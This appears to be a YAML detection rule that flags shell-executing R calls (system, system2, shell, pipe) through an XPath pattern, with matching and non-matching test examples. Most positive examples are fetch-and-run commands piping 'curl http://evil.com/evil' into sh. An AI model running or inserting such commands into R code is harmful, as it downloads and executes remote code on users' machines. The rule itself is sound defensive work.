name: system_pattern
version: "0.3.0"
type: R
attck:
  - T1059.003
  - T1059.004
  - T1195.002
message: >-
  system(), system2(), shell() (on Windows), and pipe() execute arbitrary shell
  commands.
xpath: >-
  //SYMBOL_FUNCTION_CALL[
    (text() = 'system' or text() = 'system2' or text() = 'shell'
      or text() = 'pipe')
    and not(preceding-sibling::OP-DOLLAR)
    and not(preceding-sibling::OP-AT)
  ]
positive_examples:
  - |
    system("curl http://evil.com/evil | sh")
  - |
    system2("sh", args = c("-c", shQuote("curl http://evil.com/evil | sh")))
  - |
    shell("curl http://evil.com/evil | sh")
  - |
    base::system("curl http://evil.com/evil | sh")
  - |
    base::system2("sh", args = c("-c", shQuote("curl http://evil.com/evil | sh")))
  - |
    base::shell("curl http://evil.com/evil | sh")
  - |
    pipe("curl http://evil.com/evil | sh", "w")
  - |
    con <- pipe("mkdir -p /tmp/evil")
negative_examples:
  - |
    foo <- system
  - |
    foo <- system2
  - |
    foo <- shell
  - |
    foo <- pipe
  - |
    foo$system("bar")
  - |
    foo$system2("bar")
  - |
    foo$shell("bar")
  - |
    foo$pipe("bar")
  - |
    foo@system("bar")
  - |
    foo@system2("bar")
  - |
    foo@shell("bar")
  - |
    foo@pipe("bar")
